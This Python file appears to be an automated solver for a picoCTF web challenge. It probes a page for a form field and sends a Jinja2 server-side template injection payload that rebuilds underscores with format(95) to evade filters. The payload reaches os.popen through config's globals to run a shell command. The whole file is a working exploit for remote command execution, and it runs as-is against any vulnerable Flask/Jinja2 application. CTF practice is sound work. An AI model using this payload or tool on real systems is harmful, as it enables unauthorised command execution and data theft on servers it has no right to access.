import requests
import re

def _find_field_name(html):
    """Find the name of the input field in the HTML form."""
    # Look for name attribute in input/textarea
    match = re.search(r"name=['\"](.*?)['\"]", html)
    if match: return match.group(1)
    return 'content' # Found specifically for port 64751

def web_solve(params):
    target_url = params.get('url', '').rstrip('/')
    if not target_url: return {"success": False, "error": "URL required"}
    
    log = []
    log.append(f"[*] Attacking: {target_url}")

    # Master Bypass Payload (constructed underscores via %c format 95)
    payload = "{{ config|attr('%c'|format(95)*2~'class'~'%c'|format(95)*2)|attr('%c'|format(95)*2~'init'~'%c'|format(95)*2)|attr('%c'|format(95)*2~'globals'~'%c'|format(95)*2)|attr('%c'|format(95)*2~'getitem'~'%c'|format(95)*2)('os')|attr('popen')('cat flag')|attr('read')() }}"

    try:
        # 1. Inspect the form to find the parameter name (content, name, query, etc.)
        resp = requests.get(target_url, timeout=10)
        field_name = _find_field_name(resp.text)
        log.append(f"[*] Identified target parameter: '{field_name}'")
        
        # 2. Execute Payload (Both GET and POST to ensure success)
        log.append("[*] Sending Obfuscated Bypass Payload...")
        
        # Try GET first
        r = requests.get(target_url, params={field_name: payload}, timeout=10)
        match = re.search(r'picoCTF\{[^}]+\}', r.text)
        if match:
             flag = match.group(0)
             log.append("[+ SUCCESS] Flag found in GET response.")
             return {"success": True, "flag": flag, "log": "\n".join(log)}
             
        # Try POST fallback
        r_post = requests.post(target_url, data={field_name: payload}, timeout=10)
        match = re.search(r'picoCTF\{[^}]+\}', r_post.text)
        if match:
             flag = match.group(0)
             log.append("[+ SUCCESS] Flag found in POST response.")
             return {"success": True, "flag": flag, "log": "\n".join(log)}

        return {"success": False, "error": "Payload sent but flag signature not found in response body.", "log": "\n".join(log)}

    except Exception as e:
        return {"success": False, "error": str(e), "log": "\n".join(log)}
